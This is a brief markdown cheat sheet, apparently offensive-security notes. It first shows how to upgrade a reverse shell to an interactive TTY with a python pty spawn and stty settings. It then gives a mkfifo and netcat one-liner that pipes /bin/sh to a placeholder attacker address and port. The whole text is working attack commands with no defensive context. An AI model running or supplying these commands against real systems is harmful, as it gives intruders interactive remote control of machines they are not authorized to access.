# Upgrade reverse shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
stty -a 
```

```bash
export TERM=xterm-256color
stty rows 38 columns 169
^Z
```

```bash
stty -raw echo; fg
```

# Useful reverse-shell
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1|nc <MY_IP> <PORT> >/tmp/f```